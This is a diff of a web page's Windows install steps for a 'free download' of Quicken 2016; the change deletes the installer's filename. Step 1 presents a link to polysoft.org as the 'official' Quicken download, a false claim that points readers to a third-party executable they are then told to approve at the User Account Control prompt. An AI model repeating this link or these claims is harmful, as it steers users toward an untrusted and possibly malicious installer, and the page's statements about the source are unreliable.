@@ -12,7 +12,7 @@ Quicken for windows download comes packed with advanced features designed to mee
 To install Quicken 2016 on a Windows system, follow these steps:
 
 1. Click here to **quicken 2016 installer free download**: [Official Quicken 2016 Download Link](https://polysoft.org). This link directs users to the official installer.
-2. After clicking the link, the download will commence automatically. Once completed, locate the downloaded file (usually named `QuickenSetup.exe`) in the default download folder.
+2. After clicking the link, the download will commence automatically. Once completed, locate the downloaded file in the default download folder.
 3. Double-click the installer file to start the setup process. A User Account Control prompt may appear; click "Yes" to authorize the installation.
 4. The Quicken Setup Wizard opens. Read through the welcome screen and then click "Next" to proceed further.
 5. Review the End User License Agreement (EULA). If in agreement, check the acceptance box and click "Next".
